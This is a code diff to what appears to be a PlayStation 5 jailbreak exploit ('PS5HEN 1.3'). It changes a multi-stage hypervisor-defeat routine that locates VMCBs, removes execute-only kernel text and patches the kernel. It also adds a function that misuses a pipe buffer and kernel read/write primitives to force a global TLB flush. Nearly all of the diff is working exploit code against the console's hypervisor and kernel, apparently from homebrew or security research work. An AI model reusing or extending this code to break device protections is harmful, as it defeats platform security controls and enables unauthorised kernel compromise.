@@ -4,7 +4,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <print>
-
+#include <fcntl.h>
 #include <sys/cpuset.h>
 
 extern "C" int cpuset(cpusetid_t *);
@@ -158,7 +158,6 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
         uint64_t ptr_pa;
 
         if (ctx->fw >= 0x0300) {
-            
             uint64_t vmcb_pa = get_vmcb(ctx, c);
             std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
 
@@ -166,14 +165,14 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
                 ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
                 ctx->vmcb_count++;
             }
-
-        } 
+        }
         else {
             // use VA + pmap_kextract (embedded HV has valid kernel VAs)
             uint64_t ptr_va = ctx->hv_data_va + vcpu_off + (uint64_t)c * stride;
             ptr_pa = pmap_kextract(ptr_va);
 
-             uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
+
+            uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
             if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF) != 0) {
                 std::print("  core {:2d}: bad vmcb_va 0x{:x}\n", c, vmcb_va);
                 return -2;
@@ -186,7 +185,7 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
                 ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
                 ctx->vmcb_count++;
             }
-        }  
+        }
     }
     std::print("  {} vmcbs\n", ctx->vmcb_count);
     return ctx->vmcb_count == 0 ? -2 : 0;
@@ -296,7 +295,7 @@ int stage4_verify(hv_defeat_ctx *ctx) {
     usleep(15000000);
     std::print("\n[stage4] verify\n");
 
-    pin_to_first_available_core();
+    //pin_to_first_available_core();
 
     uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
     uint64_t hvdata = kr8(ctx->hv_data_va);
@@ -540,6 +539,9 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
     if ((r = stage3b_remove_xotext(&ctx))) return r;
 
     if (true) {
+
+        kernel_pmap_invalidate_all();
+
         stage4_verify(&ctx);
 
         stage5_patch_kernel(&ctx);
@@ -559,5 +561,69 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
     notify(std::format("Welcome To PS5HEN 1.3\nPlayStation 5 FW: {:d}.{:02d}\nBy SpecterDev, f0f, flat_z",
         (fw_ver >> 24) & 0xFF, (fw_ver >> 16) & 0xFF));
 
+    return 0;
+}
+
+
+// Credits: idlesauce
+// does pmap_invalidate_all(kernel_pmap)
+// on 4.03, pmap_pcid_enabled and invpcid_works are both 0 - it seems zen 2 doesnt support INVPCID
+// so this will do invltlb_glob invalidating all tlb caches, including global entries, on all cores
+int kernel_pmap_invalidate_all(void) {
+
+    std::print("[stage3c] invalidate paging entries\n");
+
+    static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};
+
+    int pipe_fds[2];
+    // set O_NONBLOCK to avoid PIPE_DIRECTW
+    if (pipe2(pipe_fds, O_NONBLOCK)) {
+        return -1;
+    }
+
+    // the pipe starts off as 1 page large - we need to write into the pipe so it will grow to BIG_PIPE_SIZE
+    // we need to make sure pmap_invalidate_all doesnt use the one page fast path
+    if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
+        close(pipe_fds[0]);
+        close(pipe_fds[1]);
+        return -1;
+    }
+
+    // dont need this anymore
+    close(pipe_fds[1]);
+
+    uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);
+
+    // for (uint64_t i=0; i<0x40; i=i+8) {
+    //     uint64_t read_val;
+    //     kernel_copyout(read_fd_file_data + i, &read_val, sizeof(read_val));
+    //     std::print("Read value at add 0x{:016x} : 0x{:016x}\n", read_fd_file_data + i, read_val);
+    // }
+
+    // std::print("This is read_fd_file_data: {:016x}\n", read_fd_file_data);
+    if (!INKERNEL(read_fd_file_data)) {
+        close(pipe_fds[0]);
+        return -1;
+    }
+
+    uint64_t read_fd_buffer;
+    kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer, sizeof(read_fd_buffer));
+    // std::print("This isread_fd_buffer: {:016x}\n", read_fd_buffer);
+    if (!INKERNEL(read_fd_buffer)) {
+        close(pipe_fds[0]);
+        return -1;
+    }
+
+    // inside pmap_remove anyvalid has to be 1 for pmap_invalidate_all to be called
+    // anyvalid is only set if there is at least 1 non global entry being removed
+    // set the first entry as non global, its being removed anyway so its fine (?)
+    if (!page_remove_global(read_fd_buffer)) {
+        close(pipe_fds[0]);
+        return -1;
+    }
+
+    // fd 0 is read end, it holds the buffer, this close is what does the pmap_invalidate_all
+    // because pmap == kernel_pmap, it will do invltlb_glob
+    close(pipe_fds[0]);
     return 0;
 }
